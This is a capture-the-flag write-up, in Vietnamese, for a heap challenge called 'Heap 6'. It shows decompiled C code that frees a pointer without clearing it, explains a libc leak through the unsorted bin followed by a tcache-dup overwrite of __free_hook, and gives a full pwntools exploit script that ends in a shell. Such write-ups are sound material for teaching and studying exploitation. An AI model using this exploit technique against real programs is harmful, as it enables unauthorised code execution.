# Heap 6

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)readInt() )
    {
      case 1u:
        createHeap();
        break;
      case 2u:
        showHeap();
        break;
      case 3u:
        editHeap();
        break;
      case 4u:
        deleteHeap();
        break;
      case 5u:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}
```

```c
__int64 createHeap()
{
  signed int size_4; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  size_4 = readInt();
  if ( (unsigned int)size_4 >= 0xA )
    exit(0);
  store[size_4] = malloc(0x80uLL);
  storeSize[size_4] = 0x80;
  printf("Input data:");
  readStr(store[size_4], 0x80LL);
  puts("Done");
  return 0LL;
}
```

```c
__int64 deleteHeap()
{
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Input index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( store[Int] )
  {
    free((void *)store[Int]);
    puts("Done ");
  }
  return 0LL;
}
```

## vulnerability

Ta thấy ở trong hàm `deleteHeap`, sau khi delete chương trình không set lại giá trị pointer thành NULL, dẫn đến các lỗ hổng double free, use after free. Chương trình sử dụng `libc 2.28` đã sử dụng `tcache` nên ta có thể sử dụng `tcache dup` để overwrite `__free_hook` và call đến `system`. để có thể leak được libc, ta dùng use after free để leak địa chỉ của unsorted bin. Trước đó cần fill up tcache để khi free thì nó sẽ vào unsorted bin. 

## exploit

```python
p = start()
libc = ELF('./libc.2.28.so')

def create(idx,data):
    p.send(b'1')
    p.sendafter(b'Index:',str(idx).encode())
    p.sendafter(b'Input data:',data)

def show(idx, data_before):
    p.send(b'2')
    p.sendafter(b'Index:',str(idx).encode())
    p.recvuntil(b'Data = ' + data_before)
    return p.recvline()[:-1]

def edit(idx,data):
    p.send(b'3')
    p.sendafter(b'Input index:',str(idx).encode())
    p.send(data)

def delete(idx):
    p.send(b'4')
    p.sendafter(b'Input index:',str(idx).encode())

create(0, b'a')

# fill up tcache
for i in range(1,8):
    create(i,b'a')

for i in range(1,8):
    delete(i)

delete(0)

# leak libc
libc.address = u64(show(0, b'').ljust(8, b'\x00')) - 0x3b2ca0
log.info('libc_leak: ' + hex(libc.address))
__free_hook = libc.sym['__free_hook']
log.info('__free_hook: ' + hex(__free_hook))
# tcache dup
for i in range(1,8):
    create(i,b'a')

delete(1)
delete(1)
create(1, p64(__free_hook))

create(2, b'/bin/sh\x00')

create(3, p64(libc.sym['system']))

delete(2)

p.interactive()
```
